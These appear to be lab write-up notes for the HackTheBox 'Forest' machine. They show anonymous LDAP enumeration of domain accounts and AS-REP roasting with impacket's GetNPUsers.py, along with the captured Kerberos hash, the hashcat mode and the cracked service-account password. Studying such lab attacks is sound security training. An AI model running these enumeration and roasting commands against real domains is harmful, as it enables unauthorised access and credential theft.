
```ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" "OU" | grep -i service | grep '#'```
	WinsockServices, System, htb.local
	RpcServices, System, htb.local
	File Replication Service, System, htb.local
	Managed Service Accounts, htb.local
	Service Accounts, htb.local
	svc-alfresco, Service Accounts, htb.local
	Service Accounts, Security Groups, htb.local
	Certificate Service DCOM Access, Builtin, htb.local

```ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" "objectClass=person" | grep sAMAccountName | awk '{print $2}'```
	Guest
	DefaultAccount
	FOREST$
	EXCH01$
	$331000-VK4ADACQNUCA
	SM_2c8eef0a09b545acb
	SM_ca8c2ed5bdab4dc9b
	SM_75a538d3025e4db9a
	SM_681f53d4942840e18
	SM_1b41c9286325456bb
	SM_9b69f1b9d2cc45549
	SM_7c96b981967141ebb
	SM_c75ee099d0a64c91b
	SM_1ffab36a2f5f479cb
	HealthMailboxc3d7722
	HealthMailboxfc9daad
	HealthMailboxc0a90c9
	HealthMailbox670628e
	HealthMailbox968e74d
	HealthMailbox6ded678
	HealthMailbox83d6781
	HealthMailboxfd87238
	HealthMailboxb01ac64
	HealthMailbox7108a4e
	HealthMailbox0659cc1
	sebastien
	lucinda
	andy
	mark
	santi

There are tools for enumerating important users like windapsearch and maybe some others, might look into them later. The service account was kind of hard to find and user accounts and service accounts should be searched separately when using ldapsearch.

Because we really don't have any other ways but to test for pre-auth for each user, we should use GetNPUsers.py impacket script.

If an account doesn't have pre-auth enabled, you can ask for the encrypted TGT without any authentication. Kerberos doesn't validate who is asking if pre-authentication is disabled.

```/opt/impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile adUsers.ldapsearch -format hashcat -no-pass```
	$krb5asrep$23$svc-alfresco@HTB.LOCAL:4dc1bc06676a503b2431bdde7581abb3$d73416e6d6ef52f5a7fba7762de8a985a5de851e480a359c0c389892f22affe08eb096d6d5d87c990d6b873d7db34b37a8aaf7d5807e5591f59e8fc78afa040e04ab7a6fa7f65fa2eec315c09339b1e1c8d37b0862bc320e3dc39b4217356ab8028dd383ce81e7e67d9ac0983c3dbdef9072548497e14268a93105f89dd644469afbb32d36885bc16ed272cb91742800ce7b2de7aec1ed65c9612da7a13f274add365f60be35aa191a21c4ac9d55a245c4e3b9c88cc84858d608395fd31c8025c4ca5898567fcea957943146799ca5796f44b8af4083011f868f4dd15e808faf387e27c70fc7

Hash type for hashcat is 18200 (Kerberos 5, etype 23, AS-REP)
Cracked credentials: ==svc-alfresco : s3rvice==